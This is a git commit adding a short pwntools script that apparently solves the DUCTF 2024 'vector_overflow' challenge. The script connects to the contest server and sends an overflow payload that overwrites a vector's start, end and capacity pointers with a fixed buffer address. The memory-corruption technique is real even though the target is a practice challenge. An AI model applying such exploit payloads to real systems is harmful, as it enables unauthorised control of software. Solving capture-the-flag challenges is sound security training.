698f74c14d70df802533d4cf05ccafd37ef56fbc
Konstantin Perikov <pericov.ko@gmail.com>
2024-08-17 12:44:58 +0100

    feat: adding file ductf5/vector_overflow.py

---
+++ ductf5/vector_overflow.py
@@ -0,0 +1,16 @@
+from pwn import *
+
+p = remote("2024.ductf.dev", 30013)
+
+BUF = 0x4051e0
+
+payload = b""
+payload += b"DUCTF"
+payload += b"\x00" * 11 # fill up to 16 bytes
+payload += p64(BUF)     # v.start
+payload += p64(BUF + 5) # v.end
+payload += p64(BUF + 5) # v.capacity
+
+p.sendline(payload)
+
+p.interactive()
